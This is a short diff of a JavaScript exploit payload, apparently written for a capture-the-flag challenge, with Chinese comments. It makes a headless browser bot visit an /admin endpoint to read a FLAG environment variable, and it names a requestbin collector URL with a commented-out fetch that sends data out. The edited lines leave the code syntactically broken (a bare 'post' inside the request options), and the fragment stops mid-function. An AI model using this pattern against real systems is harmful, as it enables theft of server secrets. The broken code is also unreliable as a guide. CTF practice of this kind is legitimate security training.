@@ -10,16 +10,17 @@
     const YOUR_RECEIVE_URL = "http://www.requestbin.cn:80/1fn11tu1"; // 例：https://en8x0z9p37r.x.pipedream.net/
    // fetch(YOUR_RECEIVE_URL+'?id-='+Math.random());
     // ###########################################################################
-    const param = {"url":"http://223.6.249.127:11836/admin"};
+    const param = "http://223.6.249.127:11836/admin";
     // 核心：访问/admin获取环境变量的FLAG，Puppeteer同域无跨域，直接解析JSON
     fetch('http://223.6.249.127:11836/visit',{
-      method: 'POST', // 必须指定为 POST
+      'post', // 必须指定为 POST
       headers: {
         'Content-Type': 'application/json; charset=utf-8', // 声明 JSON 格式
         // 可选：添加其他请求头（如 Token）
         // 'Authorization': 'Bearer ' + token
       },
-      body: JSON.stringify(param) // 将 JS 对象转为 JSON 字符串
+      body: JSON.stringify(param), // 将 JS 对象转为 JSON 字符串
+      credentials: 'same-origin'
     })
         .then(res => {
             
